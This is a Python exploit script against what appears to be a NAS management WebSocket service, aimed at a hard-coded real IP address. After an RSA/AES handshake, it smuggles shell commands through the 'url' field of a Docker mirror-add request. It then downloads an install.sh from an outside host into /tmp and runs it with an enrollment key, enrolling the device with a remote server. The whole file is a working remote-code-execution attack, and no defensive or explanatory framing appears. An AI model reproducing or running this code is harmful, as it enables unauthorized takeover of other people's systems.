import websocket
import json
import time
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

TARGET_URL = "ws://8.148.149.200:5666/websocket?type=main"

# 使用绝对路径，并移除 sudo，假设当前进程已有执行权限或通过 root 运行
# 使用 && 确保前一个命令成功才执行后一个
STEP1_CMD = "/usr/bin/wget -O /tmp/install.sh https://hub.20250225.ggff.net/komari-monitor/install.sh"
STEP2_CMD = "/bin/chmod +x /tmp/install.sh && /bin/bash /tmp/install.sh -e http://www.xuanying.dpdns.org --auto-discovery CX9cJyXs312zYwDWC8BpRkFV"

class TrimEncryptedExploit:
    def __init__(self):
        self.si = ""
        self.server_pub_key = ""
        self.step = 0 

    def get_reqid(self):
        return str(int(time.time() * 100000))

    def create_encrypted_packet(self, inner_json_dict):
        try:
            aes_key = get_random_bytes(32)
            aes_iv = get_random_bytes(16)
            inner_data = json.dumps(inner_json_dict, separators=(',', ':')).encode('utf-8')
            cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
            encrypted_body = cipher_aes.encrypt(pad(inner_data, AES.block_size))
            rsa_key_obj = RSA.import_key(self.server_pub_key)
            cipher_rsa = PKCS1_v1_5.new(rsa_key_obj)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            
            return json.dumps({
                "req": "encrypted",
                "iv": base64.b64encode(aes_iv).decode('utf-8'),
                "rsa": base64.b64encode(encrypted_aes_key).decode('utf-8'),
                "aes": base64.b64encode(encrypted_body).decode('utf-8')
            }, separators=(',', ':'))
        except Exception as e:
            print(f"加密失败: {e}")
            return None

    def send_cmd(self, ws, cmd):
        payload = {
            "req": "appcgi.dockermgr.systemMirrorAdd",
            "reqid": self.get_reqid(),
            "url": f"https://test.com ; {cmd} ; /usr/bin/echo",
            "name": "Exploit",
            "si": self.si
        }
        packet = self.create_encrypted_packet(payload)
        if packet:
            ws.send(packet)

    def on_open(self, ws):
        print("[*] 连接已打开，握手中...")
        ws.send(json.dumps({"reqid": self.get_reqid(), "req": "util.crypto.getRSAPub"}))

    def on_message(self, ws, message):
        try:
            data = json.loads(message)
            # 自动处理初始握手
            if "pub" in data:
                self.server_pub_key = data["pub"]
                self.si = str(data["si"])
                print("[*] 握手成功，开始下载...")
                self.step = 1
                self.send_cmd(ws, STEP1_CMD)
            # 处理指令响应
            elif self.step == 1:
                print(f"[*] 第一阶段响应: {data.get('result')}")
                print("[*] 等待安装...")
                time.sleep(5)
                self.step = 2
                self.send_cmd(ws, STEP2_CMD)
            elif self.step == 2:
                print(f"[*] 第二阶段响应: {data.get('result')}")
                print("[*] 操作完成。")
                ws.close()
        except Exception as e:
            print(f"解析错误: {e}, 原始消息: {message}")

    def run(self):
        ws = websocket.WebSocketApp(TARGET_URL, on_open=self.on_open, on_message=self.on_message)
        ws.run_forever()

if __name__ == "__main__":
    TrimEncryptedExploit().run()
